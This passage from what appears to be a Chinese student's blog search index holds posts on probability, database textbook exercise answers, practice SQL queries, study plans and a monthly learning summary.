4.4,至少有一人拿到了自己的帽子的概率为：\n$$P\\Big(\\bigcup_{i=1}^{N}E_{i}\\Big)\\:=\\sum_{i=1}^{N}P(E_{i})-\\sum_{i_{1}","date":"2024-12-27T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%A6%82%E7%8E%87%E8%AE%BA%E6%A8%A1%E5%9E%8B%E5%8F%8A%E5%B0%8F%E7%BB%93/","title":"概率论模型及小结"},{"content":"第二章 关系数据库 1.试述关系模型的三个组成部分\n关系数据结构：只包含单一的数据结构——关系，由三种类型：基本关系（基本表），查询表和视图表\n关系操作集合：查询（选择，投影，并，差，笛卡尔积），插入，删除，修改\n关系完整性约束\n2.关系数据语言的特点和分类\n(1)关系代数语言 (2)关系演算语言：元组关系演算语言和域关系演算语言 (3)SQL：具有关系代数和关系演算双重特点的语言\n3.解释术语，说明关系与联系\n（1）域：一组具有相同数据类型的值的集合\n（2）笛卡尔积：给定一组域D1,D2,\u0026hellip;,Dn,D1×D2×\u0026hellip;×Dn={(d1,d2,\u0026hellip;,dn),di∈Di}\n（3）关系：D1×D2×\u0026hellip;×Dn（笛卡尔积）的有限子集，表示为R（D1,D2,D3,\u0026hellip;,Dn），n=1，一元关系，n=2，二元关系，也是一张二维表\n（4）元组：笛卡尔积中每一个元素{(d1,d2,\u0026hellip;,dn),di∈Di}，一个n元组\n（5）属性：在二维表中，是一列，n目关系有n个属性（列）\n（1）主码：从多个候选码中选定一个作为主码\n（2）候选码：某一属性组的值额能唯一的标识一个元组，而其子集不能\n（3）外码：关系R中的一个属性F并不是R的码，但对应另一个关系S中的主码Ks，F称为R和S的外码，定义在同一个域上\n（1）关系模式（型）：关系的描述，R（U,D,DOM,F)，R为关系名，U为属性名集合，D为属性来自的域，DOM为属性向域的映像集合（如属性的类型，长度\n（2）关系（值）：包括基本关系（基本表），查询表，视图表\n（3）关系数据库：所有关系的集合\n4.举例说明关系模式和关系的联系\n关系是关系模型在某一时刻的状态或内容，关系模式是静态的，稳定的，关系是动态的，随时间不断变化的。\n5.试述关系模型的完整性规则。在参照完整性中，说明情况下外码属性的值可以为空值\n实体完整性：主属性不能去空值（null）\n参照完整性：两个关系之间存在着属性的引用，如学生的学号取值需要参照专业关系中的专业号\n用户定义的完整性：应用领域需要遵循的约束条件，语义约束\n在参照完整性规则中，外码属性的值可以取空值只有当外码的每个属性值取空值（二维表中每一列都是NULL）\n6.试述等值连接与自然连接的区别和联系\n自然连接是一种特殊的等值连接，，自然连接取消重复列\n7.关系代数的基本运算\n传统的集合运算：二目运算，包括并，差，交，笛卡尔积\n专门的关系运算：选择，投影，连接（查询就是一个关系在属性上的投影，取消某些列和重复元组），除运算\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第二章习题答案"},{"content":"第一章 绪论 1.试述数据，数据库，数据库管理系统，数据库系统的概念\n数据：描述事物的符号 数据库DB：长期储存在计算机内，有组织的，可共享的大量数据的集合。数据库中的数据按一定的数据模型组织，描述和储存，具有较小的冗余度，较高的数据独立性和易扩展性，并可为各种用户共享 数据库管理系统DBMS：系统软件，有以下功能： 数据定义 数据组织，存储和管理 数据操纵功能 数据库的事务管理和运行管理 数据库建立和维护 数据库系统DBS：由DB，DBMS,DA组成的存储，管理，处理和维护数据的系统 2.使用数据库有什么好处？\n数据结构化：整体和内部\n数据的共享性高，冗余度低且易扩展：大大减少数据冗余，节约存储空间，避免数据之间的不相容性与不一致性\n数据独立性高：\n物理独立性，用户的应用程序与数据库中数据库数据的物理存储相互独立 逻辑独立性：用户的应用程序与数据库的逻辑结构是相互独立 数据由数据库管理系统统一管理和控制\n数据的安全性保护：保护数据以防止不合法使用造成的数据泄密和破坏 数据的完整性检查：数据的正确性，有效性和相容性 用户可以并发控制 数据库恢复功能：比如说rollback 3.试述文件系统与数据库系统的区别和联系\n见P7表1.1\n6.数据库管理系统的主要功能\n在数据库建立，运用和维护时对数据库进行统一控制，以保证数据的完整性和安全性，并在多用户同时使用数据库时进行并发控制，在发生故障后对数据库进行恢复\n7.什么是概念模型？试述概念模型的作用\n信息模型，按用户的观点对数据和信息建模，主要用于数据库设计，用于信息世界的建模\n8.定义并解释概念模型中以下术语：\n实体：客观存在并可相互区别的事物。如具体的人，事，物，抽象的概念或联系\n实体型：用实体名及其属性名集合来抽象和刻画同类实体，如学生（学生号，姓名，性别，所在院系\u0026hellip;)\n实体集：同一类型实体的集合。例如，全体学生就是一个实体集\n实体之间的联系：或称不同实体集之间的联系\n9.试述数据模型的概念，数据模型的作用和数据模型的三个要素\n对现实世界数据特征的抽象，用来描述数据，组织数据和对数据进行操作\n比较真实地模拟现实世界 容易为人所理解 便于在计算机上实现 10.试述层次模型的概念，举出三个实例\n有且只有一个结点没有双亲结点（根节点），根以外的其他结点有且只有双亲结点，实例：行政结构，家族关系，生物分类学，电脑文件系统\n11.试述网状模型的概念，举出三个实例\n允许一个以上的结点无双亲，一个结点可以有多于一个的双亲，如互联网，社交网络，地铁交通网络\n12.试述层次，网状模型的优缺点\n层次模型的优点：\n数据结构简单清晰 数据库的查询效率高 层次数据模型提供了良好的完整性支持 层次模型的缺点：\n现实世界中很多联系是非层次性的 如果一个结点具有多个双亲结点等，不便于用层次模型表示联系 查询子女结点必须通过双亲结点 由于结构严密，层次命令趋于程序化 网状模型的优点：\n能够更为直接地描述现实世界，如一个结点可以有多个双亲，结点之间可以有多种联系 具有良好地性能，存取效率较高 网状模型的缺点：\n结构过程比较复杂 网状模型的DDL,DML复杂，需要嵌入语言 记录之间的联系通过存取路径实现，应用程序在访问数据时候必须选择适当的存取路径，用户必须了解系统结构的细节，加重了应用程序的负担 13.试述关系模型的概念，定义并解释以下术语\n关系模型由一组关系组成，每个关系的数据结构都是一张规范化的二维表。\n元组：表中的一行即为一个元组\n属性：表中的一列即为一个属性\n关系：一个关系对应以一张表\n码：某个可以唯一确定一个元组的属性组，如学生的学号\n域：一组具有相同数据类型的值的集合，如性别的域是{男，女}，大学生奈年龄属性的域是（15，45）\n分量：元组中的一个属性值\n14.试述关系数据库的特点\n规范化，即关系的每一个分量必须是一个不可分的数据项\n关系模型与格式化模型不同，建立在严格的数学概念的基础上\n概念单一，实体间的联系，对数据的检索和更新也是关系（Table），数据结构简单清晰\n存取路径透明，更高的数据独立性，更好的安全保密性，简化程序员的工作，但查询效率较低\n** 在计算机中，从某个角度*看不到的特性称该特性是透明的*。这个意义上的“透明”与社会生活中的透明含义*恰好相反*，例如计算机组织对程序员是透明的，就是说计算机组织对程序员来说是看不到的，也不需要看到的。*和汉语字典里面的意思不一样。 ***\n15，试述数据库系统的三级模式结构，并说明优点\n外模式，模式，内模式\n外模式：子模式或用户模式，数据库用户能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示\n内模式：存储模式，数据物理结构和存储方式的描述，是数据在数据库内部的组织方式\n模式：逻辑模式，是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图，一个数据库只有一个模式\n使用户能够逻辑的，抽象的处理数据，而不必关心数据在计算机中的具体表示方式与存储方式\n17.什么叫数据与程序的物理独立性？数据与程序的逻辑独立性？为什么数据库由数据与程序的独立性？\n物理独立性：当数据库的存储结构改变时，由数据库管理员对模式/内模式映像作响应改变\n逻辑独立性：当模式改变时，由数据库管理员对各个外模式/模式的影响作相应改变，可以使外模式保持不变。应用程序是依据数据的外模式编写，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。\n数据与程序之间的独立性使得数据的定义和描述可以从应用程序中分离出去。由于数据的存储由数据库管理系统管理，从而简化了应用程序的编制，大大减少了应用程序的维护和修改。\n18.试述数据库系统的组成\n数据库，数据库管理系统，应用程序和数据库管理员\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第一章习题答案"},{"content":"“中国的孩子自一出生就在冲刺，从双语幼儿园到重点高中，再经历千军万马过独木桥的高考。\n在人类前半生的这场性爱过程中，他们做足了前戏，也做了太久前戏，\n而这一切都在上大学时完成了痛快的射精，仿佛所有分泌的前列腺液都是值得的”\n","date":"2024-12-05T00:00:00Z","image":"https://Frederick2313072.github.io/p/20%E5%B2%81%E4%BA%86%E4%BD%86%E6%9C%89%E4%BA%9B%E8%AF%B4%E4%BA%86%E4%B8%8D%E5%A6%82%E4%B8%8D%E8%AF%B4/547a6a87146ee7bd92f1c1efdf2458045e2f600d_hu_c3d7546e34c20d63.jpg","permalink":"https://Frederick2313072.github.io/p/20%E5%B2%81%E4%BA%86%E4%BD%86%E6%9C%89%E4%BA%9B%E8%AF%B4%E4%BA%86%E4%B8%8D%E5%A6%82%E4%B8%8D%E8%AF%B4/","title":"20岁了但有些说了不如不说"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 SELECT RTRIM(vend_name) + \u0026#39;(\u0026#39;+ --右边取消空格 RTRIM(vend_country) + \u0026#39;)\u0026#39; AS vend_title From Vendors ORDER BY vend_name; SELECT prod_id,quantity,item_price,quantity*item_price AS expanded_price FROM OrderItems; SELECT vend_name,UPPER(vend_name) --大写 AS vend_name_upcase FROM Vendors ORDER BY vend_name; SELECT cust_name,cust_contact FROM Customers WHERE SOUNDEX(cust_contact) = SOUNDEX(\u0026#39;Michael Green\u0026#39;); --近似发音 SELECT order_num FROM Orders WHERE DATEPART(yy,order_date) = 2020; SELECT AVG(prod_price) AS avg_price --取平均值 FROM Products WHERE vend_id = \u0026#39;DLL01\u0026#39;; SELECT COUNT(*)AS num_cust --对所有行计数 FROM Customers; SELECT MAX(prod_price) AS max_price FROM Products; SELECT SUM(quantity*item_price) AS items_ordered FROM OrderItems WHERE order_num = 20005; SELECT AVG(DISTINCT prod_price) AS avg_price FROM Products Where vend_id =\u0026#39;DLL01\u0026#39;; SELECT COUNT(*) AS num_items,MIN(prod_price) AS price_min,MAX(prod_price) AS proce_max,AVG(prod_price) AS price_avg --组合聚集函数 FROM products; SELECT vend_id,COUNT(*) AS num_prods FROM Products Group BY vend_id HAVING COUNT(*) \u0026gt;= 2;--过滤分组，group by 和 having结合 SELECT order_num,COUNT(*)AS items FROM OrderItems Group BY order_num HAVING COUNT(*) \u0026gt;= 3--检索包含三个或更多物品的订单号和订购物品的数目 ORDER BY items,order_num;--按订购物品的数目排序输出，having在group by前，order by后 SELECT cust_id FROM OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;; SELECT cust_id FROM Orders WHERE order_num IN (20007,20008); SELECT cust_id FROM Orders WHERE order_num IN (SELECT cust_id FROM Orders WHERE order_num IN (20007,20008));--建立以上的子查询，由内向外 SELECT cust_name,cust_state,(SELECT COUNT(*)FROM Orders WHERE Orders.cust_id=Customers.cust_id) AS orders --子查询对检索出的每个顾客执行一次，用句点避免混淆列名 FROM Customers ORDER BY cust_name;--对于检索出的每个顾客，统计其在Orders表中的订单数目 SELECT vend_name,prod_name,prod_price FROM Vendors,Products WHERE Vendors.vend_id = Products.vend_id; BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 DECLARE CURSOR CustCursor IS SELECT * FROM Customers WHERE cust_email IS NULL; ALTER TABLE Vendors ADD CONSTRAINT PRIMARY KEY(vend_id)--设置主键，DBMS默认主键基本不修改或更新，不能重用 ALTER TABLE Orders ADD CONSTRAINT FOREIGN KEY (cust_id) REFERENCES Customers(cust_id);--将此表中的cust_id设置为Customers的主键，即外键。外键有助防止意外删除，若删除，级联删除 CREATE INDEX prod_name_ind--索引名 ON Products(prod_name)--被索引的表，列 CREATE TRIGGER customer_state ON Customers FOR INSERT,UPDATE AS UPDATE Customers SET cust_state=Upper(cust_state) WHERE Customers.cust_id = inserted.cust_id;--创建一个触发器，对所有INSERT和UPDATE操作，将cust_state转为大写 ","date":"2024-12-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A%E4%BE%8B%E5%AD%90/","title":"SQL必知必会例子"},{"content":"Python 爬虫 建模 数据挖掘（统计方向的待定） JS 做个代办事项列表（我所能想到JS对我的唯一用处就是网页加个响应什么的）\n重新巩固C语言 Unity 学习C#语言，可能大创写个游戏，或者跟之前联系好的设计系朋友写着玩玩\nLeetcode 刷题周赛 算法与数据结构 算是提前预习大三内容，以及体验下朋友所说的算法addiction\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/plan-after-this-semester/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202170215_hu_f5523af80b8f11a1.jpg","permalink":"https://Frederick2313072.github.io/p/plan-after-this-semester/","title":"Plan after this semester"},{"content":"Python 基础语法到面向对象编程，小项目只用过pygame写了一个窗口射击游戏，图灵系列那本python编程学的很流畅，很快能上手项目\nJavascript 到现在只学了点皮毛，只会做动态内容更新，也只是自己做html网页时乱加上去的\nLinux 一开始甚至打算买个电脑重装Linux，看到无数人因为Linux整个大学没敲几行代码被劝退了，最后只学了Bash，但是和windows的shell不兼容，用的乌班图版本，以下是我试过的所有办法：\n虚拟盘开机和Windows双系统 虚拟机如virtualbox和Vmware（据说可以申请阿里云学生服务器，但我用的前者） Windows自带wsl，最后自己搞了个图形化界面，甚至现在偶尔还在用 工具 Vim：很容易上手，但不常用就会很快忘了（谁没事会在shell里面编辑文本） Nano：可读性比Vim强，但我已经习惯Vim了 SSH Docker Git：最重要的一个，不用多说 数据库 学校课程，但反而很不上心，明天开始重学\nCS常识 b站有个做的很好的科普视频，会放在Resource里面\nHtml 严格来说，太简单算不上编程语言\nCSS 之前自己做了个CSS模板，结果在运行cmd时被tailwind覆盖完了，没有git到远程仓库\u0026hellip;\u0026hellip;\n数学分析3，概率论 前者太难听不懂，后者太简单不想听\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/summary-in-november/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202225640_hu_95a0bebc19439f13.jpg","permalink":"https://Frederick2313072.github.io/p/summary-in-november/","title":"Summary in November"},{"content":"第三章 SQL 1.试述SQL的特点\n综合统一，高度非过程化，面向集合的操作方式，以同一种语法结构提供多种使用方式\n2.说明在DROP TABLE时，RESTRICT和CASCADE的区别\n","date":"0001-01-01T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/","title":""}]